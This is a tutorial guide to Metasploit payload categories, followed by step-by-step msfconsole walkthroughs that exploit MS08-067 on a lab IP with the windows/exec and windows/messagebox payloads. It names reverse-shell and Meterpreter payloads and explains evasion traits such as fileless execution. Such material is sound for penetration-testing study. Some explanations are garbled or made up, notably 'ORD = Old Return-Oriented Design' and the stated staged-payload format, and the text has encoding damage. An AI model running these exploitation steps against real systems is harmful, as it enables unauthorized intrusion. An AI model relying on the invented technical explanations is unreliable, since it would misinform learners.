# Metasploit Payloads Guide

## Overview
Metasploit payloads are the actual code delivered to a target system after an exploit succeeds. Payloads provide access, execute commands, or establish communication back to the attacker.

Payloads are categorized into several important types:

---

## 1. Singles (Single Payloads)
Single payloads are self-containedâ€”everything needed is delivered in one shot.

*   **No external connections required**
*   **Good for stable, simple execution**
*   **Larger in size**
*   **Often named without `/` or `_` structure (but depends on type)**

**Examples:**

    windows/adduser
    linux/x86/exec


---

## 2. Stagers
Stagers set up a communication channel between attacker and victim.

*   **Small in size**
*   **Useful when exploiting memory-constrained vulnerabilities**
*   **Prepare the environment for stages**

**Example stagers:**

    windows/shell/reverse_tcp
    windows/meterpreter/reverse_http


---

## 3. Stages
Stages are the second part of a staged payload.

*   **Delivered after the stager**
*   **Provide advanced features (shell, Meterpreter, etc.)**
*   **Depend on the communication channel created by stager**

**Examples:**
    
    windows/meterpreter
    windows/x64/meterpreter
    linux/x86/shell


---

## 4. Inline (Non-Staged) Payloads
Inline payloads (stageless) include *everything in one payload*.

*   **No stager + stage separation**
*   **Larger, but more stable**
*   **Not detectable through staging behavior**

**Example inline payload:**

    windows/meterpreter_reverse_tcp


---

## 5. Staged Payloads
Staged payloads use the format: `exploit/os/payload_stage`

**Example:**

    windows/shell/reverse_tcp


**How they work:**
1.  **Send small stager first**
2.  **Stager connects back**
3.  **Stage (full payload) is transferred next**

**Useful for:**
*   Memory-limited exploits
*   Obfuscation
*   Network-restricted environments

---

## 6. Stageless Payloads
Stageless payloads use: `payload_os_payloadtype`

**Example:**

    windows/shell_reverse_tcp

**How they work:**
*   **Entire payload sent at once**
*   **No extra download required**

---

## 7. Meterpreter Payload
Meterpreter is an advanced, post-exploitation payload.

**Features:**
*   In-memory execution
*   Encrypted communication
*   Command extension modules
*   File upload/download
*   Screenshots, webcam capture, keylogging
*   Pivoting
*   Post-exploitation automation

**Examples:**

    windows/meterpreter/reverse_tcp
    windows/x64/meterpreter_reverse_https

---

## 8. PassiveX Payload
PassiveX uses Internet Explorer's ActiveX controls to bypass restrictive firewalls.

*   Useful where TCP outbound connections are restricted
*   Payload runs via HTTP traffic
*   Rarely used today

 ## 9. NoNX Payloads
Used to bypass **NX (No-Execute)** and **DEP (Data Execution Prevention)** protections.

*   **NX = No-Execute bit**
*   **Mechanism:** These payloads avoid writing executable data to non-executable memory segments.
*   **Target:** Useful for older Windows targets where NX/DEP is present but bypassable.

**Example:**

    windows/nonx/meterpreter_reverse_tcp

---

## 10. Ord Payloads
**ORD = Old Return-Oriented Design**

*   **Characteristics:** Very small payloads.
*   **Use Case:** Used when buffer space is extremely limited.
*   **Compatibility:** Often used with older exploits (e.g., Windows XP era).

---

## 11. IPv6 Payloads
Payloads that use **IPv6 transport** instead of IPv4.

**Useful when:**
*   Target **only** supports IPv6.
*   Network restrictions (firewalls/IDS) block IPv4 channels but allow IPv6.

**Example:**

    windows/shell/reverse_tcp_ipv6

---

## 12. Reflective DLL Injection Payloads
These payloads use reflective DLL injection to load code **directly into memory**.

*   **No writing to disk** (Fileless).
*   **Stealthy:** Harder for traditional AV to detect.
*   **Fast execution.**
*   **Note:** This is the main technique behind Meterpreter.

**Example:**

    windows/x64/meterpreter/reverse_https

*Reflective loader is part of the Meterpreter stage.*

---

## Summary: Staged vs. Stageless

| Type | Example | Size | Network Behavior | Detection |
| :--- | :--- | :--- | :--- | :--- |
| **Staged** | `windows/shell/reverse_tcp` | Small stager + large stage | Requires 2-step transfer | Harder to detect initially |
| **Stageless** | `windows/shell_reverse_tcp` | Large single payload | No extra transfers | Easier to detect but more stable |

---

## Quick Identification Rule

### Staged Payload
*   **Syntax:** Uses `/` separator.
*   **Example:** `windows/meterpreter/reverse_tcp`

### Stageless Payload
*   **Syntax:** Uses `_` separator between payload type and transport.
*   **Example:** `windows/meterpreter_reverse_tcp`

# Specialized Metasploit Payloads

## 1. `windows/exec`
**Metasploit Payload:** `windows/exec`

`windows/exec` is a simple, non-staged (single) payload for Windows. Its purpose is to execute a **single command or binary** on the target system after exploitation.

*   **No shell returned**
*   **No connection established**
*   **Only executes the command provided in `CMD` option**

**It is often used for:**
*   Running local programs (e.g., `calc.exe`)
*   Executing commands (`ping`, `whoami`, etc.)
*   Testing vulnerability success
*   Triggering another payload manually

### Example: Using `windows/exec` with MS08-067

**1. Load the exploit**

    msf6 > use exploit/windows/smb/ms08_067_netapi

**2. Set the target host**

    msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.1.247


**3. Set the payload**

    msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/exec


**4. Check required options**

    msf6 exploit(windows/smb/ms08_067_netapi) > show options


**5. Execution Examples**

*   **Example 1: Execute a ping command**
    ```
    msf6 exploit(windows/smb/ms08_067_netapi) > set CMD "ping 192.168.1.5"
    msf6 exploit(windows/smb/ms08_067_netapi) > exploit
    ```
    *To capture ICMP packets:* `tcpdump -i eth0 icmp`

*   **Example 2: Launch Calculator**
    ```
    set CMD calc.exe
    ```

*   **Example 3: Launch Windows CMD**
    ```
    set CMD cmd.exe
    ```
    > **âš ï¸ Note:** This opens `cmd.exe` on the *victim system*, but does not give you a shell back. It appears only on the target's screen.

### ðŸŽ¯ When to Use `windows/exec`
Use when you want to:
*   Test exploit success
*   Trigger a visible action on target (like `calc.exe`)
*   Run commands without needing a reverse shell
*   Situations where outbound connections are blocked
*   Deliver a simple one-time command

---

## 2. `windows/messagebox`
**Metasploit Payload:** `windows/messagebox`

`windows/messagebox` is a non-staged (single) Windows payload that simply displays a popup message box on the target machine after exploitation.

**It is mainly used for:**
*   Demonstrating successful exploitation
*   Showing proof-of-concept (PoC)
*   Testing SMB/RPC exploit paths
*   Harmless exploitation demonstrations in training labs

*This payload does not return a shell and does not create a session.*

### ðŸ“Œ Example: Using `windows/messagebox` with MS08-067

**1. Load the MS08-067 exploit**

    msf6 > use exploit/windows/smb/ms08_067_netapi


**2. Set the target IP**

    msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.1.247


**3. Set the payload**

    msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/messagebox


**4. View payload options**

    msf6 exploit(windows/smb/ms08_067_netapi) > show options

